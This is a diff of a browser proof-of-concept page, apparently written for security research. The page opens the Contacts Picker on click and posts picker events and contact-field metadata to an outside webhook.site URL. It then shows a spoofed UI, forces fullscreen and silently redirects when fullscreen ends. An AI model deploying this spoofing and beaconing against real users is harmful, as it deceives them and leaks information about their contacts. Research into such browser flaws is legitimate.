@@ -47,36 +47,27 @@
 
 <script>
 /**
- * NOTE:
- * - Contact data is intentionally redacted
- * - This PoC demonstrates event sequencing + UI state confusion
+ * Webhook ONLY for Contacts Picker lifecycle
+ * No fullscreen / visibility / redirect logging
  */
 
 const WEBHOOK = "https://webhook.site/8c1d3f26-5912-43a1-b878-91e9d07b3274";
 
-function send(event, extra = {}) {
+function send(event, data = {}) {
   fetch(WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       timestamp: new Date().toISOString(),
       event,
-      visibility: document.visibilityState,
-      fullscreen: !!document.fullscreenElement,
-      userAgent: navigator.userAgent,
-      ...extra
+      ...data
     })
   }).catch(() => {});
 }
 
-// Track visibility changes
-document.addEventListener("visibilitychange", () => {
-  send("visibility_change");
-});
-
 document.addEventListener("click", async () => {
 
-  // 1️⃣ User gesture → Contacts Picker
+  // ✅ REQUEST #1 — picker dipanggil
   send("contacts_picker_called", {
     requested_fields: ["name", "tel", "email"]
   });
@@ -90,53 +81,47 @@ document.addEventListener("click", async () => {
         { multiple: false }
       );
 
-      if (result && result.length) {
-        granted = true;
+      granted = result && result.length > 0;
 
-        // ⚠️ REDACTED ON PURPOSE
-        send("contact_selected", {
-          granted: true,
-          contact_payload_shape: {
-            hasName: !!result[0].name,
-            hasEmail: !!result[0].email,
-            hasTel: !!result[0].tel
-          }
-        });
-      }
+      // ✅ REQUEST #2 — hasil picker
+      send("contacts_picker_result", {
+        granted,
+        payload_shape: granted ? {
+          hasName: !!result[0].name,
+          hasEmail: !!result[0].email,
+          hasTel: !!result[0].tel
+        } : null
+      });
+
     } catch (e) {
-      send("contacts_picker_error", {
+      send("contacts_picker_result", {
+        granted: false,
         error: e.name
       });
     }
   } else {
-    // API unsupported fallback
-    granted = true;
-    send("contact_selected_mock", {
-      granted: true,
-      note: "Contacts API not supported"
+    send("contacts_picker_result", {
+      granted: false,
+      error: "Contacts API not supported"
     });
   }
 
-  send("contacts_picker_closed", { granted });
+  // ⛔ Tidak kirim webhook di bawah ini
 
-  // 2️⃣ Replace page UI
+  // UI spoof
   document.getElementById("spoof").style.display = "block";
   document.getElementById("content").style.display = "none";
 
-  // 3️⃣ Enter fullscreen after picker
+  // fullscreen tetap jalan, tapi silent
   if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen()
-      .then(() => send("entered_fullscreen"))
-      .catch(() => {});
+    document.documentElement.requestFullscreen().catch(() => {});
   }
 
 }, { once: true });
 
-// 4️⃣ Detect fullscreen exit
+// fullscreen exit → redirect (silent)
 document.addEventListener("fullscreenchange", () => {
   if (!document.fullscreenElement) {
-    send("exited_fullscreen");
-
     setTimeout(() => {
       location.href = "https://google.com";
     }, 100);
